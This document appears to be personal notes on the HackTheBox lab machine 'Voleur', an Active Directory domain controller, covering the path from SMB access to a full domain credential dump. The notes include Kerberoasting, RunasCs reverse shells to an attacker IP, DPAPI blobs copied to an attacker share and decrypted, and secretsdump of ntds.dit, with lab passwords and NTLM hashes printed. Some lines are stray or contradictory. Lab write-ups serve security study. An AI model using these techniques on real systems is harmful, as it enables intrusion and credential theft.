---
tags:
  - Active_Directory
  - Windows
  - DPAPI
  - RunasCs
  - WSL
  - secretsdump
---
# Summary
- ldap can't list deleted objects, But you can enum them using local enumeration on the AD using AD module, and users should have permissions to see it.


10.10.11.76
ryan.naylor : HollowOct31Nyt

Start with nmap:
```
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-07 22:16:51Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2222/tcp open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
multi/script/web_delivery
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::

```

We found we have access to `SMB` shares, and we have file Access_Review.xlsx, but its protected with password.
```sh
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 11:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 23:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 11:40:17 2025 First-Line Support
# cd First-Line Support
ls
# ls
drw-rw-rw-          0  Wed Jan 29 11:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 11:10:01 2025 ..
-rw-rw-rw-      16896  Fri May 30 01:23:36 2025 Access_Review.xlsx
```

Use office2john to get the hash of the file so we can try to crack it.
```sh
python3 /snap/john-the-ripper/694/bin/office2john.py Access_Review.xlsx
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c


john-the-ripper hashes.txt
football1
```

Now opening the .xslx sheet
```xlsx
User	           Job Title	                Permissions	               Notes
Ryan.Naylor	First-Line Support Technician	    SMB	                       Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
Marie.Bryant	First-Line Support Technician	SMB	
Lacey.Miller	Second-Line Support Technician	Remote Management Users	
Todd.Wolfe	Second-Line Support Technician	    Remote Management Users	   Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
Jeremy.Combs	Third-Line Support Technician	Remote Management Users.   Has access to Software folder.
Administrator	Administrator	                 Domain Admin	           Not to be used for daily tasks!
			
			
Service Accounts			
svc_backup	 	Windows Backup	Speak to Jeremy!
svc_ldap		LDAP Services	P/W - M1XyC9pW7qT5Vn
svc_iis		IIS Administration	P/W - N5pXyW1VqM7CZ8
svc_winrm		Remote Management 	Need to ask Lacey as she reset this recently.
```
We got valid credentials
`svc_ldap` : `M1XyC9pW7qT5Vn`
`svc_iis` : `N5pXyW1VqM7CZ8`

looking at `svc_ldap` user in bloodhound:
![[Z Assets/Images/Pasted image 20251105024112.jpeg]]



We can do targetedkerberosting on `svc_winrm` and `lacy.miller` since we have `GenericWrite` on her, by adding SPN to it then request TGS ticket that is encrypted using this user password.
```sh
targetedKerberoast.py -v -d "$DOMAIN" -u "$USER" -k --no-pass --dc-host "$DC"

[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$f375480226aff6213617a01386c490a9$14c6e0eec3663c013f7a7f5ef50a13c4c658fc1b01f61c9af6eca4e9507b84491e05e14bbe023b34ffdd3bb8bf3709f659cf99ed5ea56f16d663ae6a822fbb850349697083a402347fa09f243a2d5e14d3d7f37389994588f839f518f0552811dd548a1f24f6cf620d0366496a8858125fae98b638f03f58247a0b36ad0465bd6df65387180d696782a6bd06863f8889714c1ee11f4ac92aa84139a55998653cc98e8bb6f4d98b1bcf8ceddc4ee8dd50189a80716cbabef2ceb15957d59e48d898d4aac3a28c229e67b7ac233c17c8c11679e3a8478cceaa8a59735e22a3ec7f1e0d412467c80e352a3fdb281bc25ef2345d9000d2ca40786bf9c283db36b98129302be3c7be4a1a44a2ed5d03640d369093b2de915525f5b5c077950c1cafbc2d0fb7864c98566a8418f4f6c8f52cf5f8c940cdcaba612f72316046e65205d6008dd329a6021af053ae7d27937ddd99d2bb7ba29509d68c934210c45afe1f3293d90577dce1f9624436807c2e80fcf5afd3b06630f499cf163a50925790a461ce4fb89e36f7665427e20df26a88bd23175cf0dca6218a5e4591962be19a1b5078e965ac8524f872f04db7e13f9e4d0202f1fc27e67600984fc99341d130a2c03bd652c7c47bfa95b99ca1ef0ac8a309a226fc661c0710b5d6b621a91e76529029a05af74539c366fe260b071249e61a83f58a432611fb0ea44fbb5a8eacfa5e9f39427e284b992bf54d9f2a37aebcb1b5ce92ca5c599440926d899baa366cc4d4564b488b8705c498932749a9d7109b955f8639254264563b83703d2b6f33dd9792d1eb5df1cc9d710a2818e74ca55fe315e2992471675af536bfc7530e66e860fc2aeccc1ed882d5fd2298f37ebb47a42a6064960c08ce90a0844ab4277bc141bc37df7358fa060fc735798fee4466b7b1953ef37f7f731a5e3bd73c2ded8131a2d4a304ac76cc4a2b03850d34983dc1edd7d079e254b85f3aa452b52a3889c483527ea10c347c1a60c194d8679b1c1ad1b266cd80161812f11fb18aacbb4a668f2d38a6896b7896d1d7d0ad23cfd48eadd461d79a381ae63156386ee89dd8a45ed02eb200366d0e9e58c6e4d374af8434da76bc1f3bbe2eeb78f4010e9922f4f4f8bf643de29ba89a41b6eb4592a252002f3d94210d9c36d883fd7a6de3ebad039bddb0887992e790203669fe3f9fe933b58b4ca25db73a0893e0eba74adf0e246eea99a62bad04e7bc576b0e25de809b299d5831a8b0445b1d29255dff39a352ec027413e5bcc14e97f0d58a00a87dda4a3c7d9fd1c198f2d14a759ad9465472634ff7fbfa8fc422e1e0cb5c0442fc5b0b85f2bd0e1a986fda3de789cdac2b369f9da0d9e03676c90ada3ce282630d0e04b66db42f67e8172d9f6858a6a284516b5e41feccf1d4b66b7f1a25e8a75c3e784df2bb1dfdab161343b837bd6e6a571bddcaf44483b5133599414ab17c284de5
[VERBOSE] SPN removed successfully for (svc_winrm)
```


> [!Fail] 
> Even we have `GenericWrite` on `lacy.miller` we faild to do `TargetedKerberosting` and `shadowCredentials`.

if we cracked it, we will get those creds:
`svc_winrm` : `AFireInsidedeOzarctica980219afi`

Now we have rdp to DC.

> [!Attention] 
> Don't forget that `svc_ldap` is in very important group which is `RESTORE_USERS` so this account can restore deleted users, And remember from that .xlsx file that there is a deleted user. So it worth checking.

```sh
evil-winrm-py -i "$IP"  -k --no-pass
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.10.11.76:5985' as 'svc_winrm@VOLEUR.HTB'
evil-winrm-py PS C:\Users\svc_winrm\Documents> 
```

Now we will try to use RunasCs.exe to get a shell as `svc_ldap`.
```powershell
evil-winrm-py PS C:\Users\svc_winrm\Documents> C:\Users\svc_winrm\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -l 2 -r 10.10.17.65:4444
```

After we got shell as `svc_ldap`, we can enumerate the deleted users
```sh
PS C:\Windows\system32> whoami
whoami
voleur\svc_ldap
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

We will try to restore `Todd Wolfe` user.
```powershell
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
Enable-ADAccount -Identity "Todd.Wolfe"
```

After restoring him, we will use sharpHound to see if we have any out-bound-control on `todd.wolfe`
![[Z Assets/Images/Pasted image 20251105034126.jpeg]]

We faild before to get anything for `lacy.miller` but now we have second opportunity with `todd.wolfe` and we already have his password from .xlsx file:
 `todd.wolfe` : `NightT1meP1dg3on14`, so tried to evil-winrm:
```sh
evil-winrm-py -i "$IP"  -k --no-pass
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to '10.10.11.76:5985' as 'todd.wolfe@VOLEUR.HTB'
[-] Failed to authenticate the user None with kerberos
```

So, instead of accessing the user from outside, lets use `RunasCs.exe` from the `ldap_svc` shell to get shell as `todd.wolfe`
```powershell
./RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -l 2 -b -r 10.10.17.65:4443
```

Looking at the shares, we have access to `Second-Line Support` folder, which contain `Archived Users\todd.wolfe`. it seems to be the home directory of `todd.wolfe` that hasn't been deleted yet, we may find stored credentials from this archive. Looking inside of it we found DPAPI.
```powershell
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\protect\S-1-5-21-3927696377-1337352550-2781715495-1110> copy 08* \\10.10.17.65\share\masterkey_blob

PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials> copy 772275FAD58525253490A9B0039791D3 \\10.10.17.65\share\credential_blob

```

Decrypt DPAPI using the user password `NightT1meP1dg3on14` and decrypt the credential_blob:
```sh
> impacket.dpapi masterkey -file masterkey_blob -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

> impacket.dpapi credential -file credential_blob -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m

```

Doing winrm as `jeremy.combs`:
```sh
evil-winrm-py -i "$IP"  -k --no-pass
```

Looking at the shares, in `Third-Line Support`:
```powershell
evil-winrm-py PS C:\IT\Third-Line Support> ls
	Directory: C:\IT\Third-Line Support
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt
```
It seems we have ssh private keys that would be useful for the ssh port that is opened at `2222`.

Looking at `Note.txt.txt`:
```powershell
evil-winrm-py PS C:\IT\Third-Line Support> type Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

Looking at `Backups`, it seems that we don't have permission as jeremy to read this directory.
```powershell
evil-winrm-py PS C:\IT\Third-Line Support> cd Backups
ls
evil-winrm-py PS C:\IT\Third-Line Support\Backups> ls
Access to the path 'C:\IT\Third-Line Support\Backups' is denied.
```

Use `id_rsa` file to access WSL, now inside the WSL we can access `C:\IT\Third-Line Support\Backups`
```sh
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM
```

After copying them to my local machine, we can dump creds.
```sh
secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```


Now we have all the domain NTLM:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
```
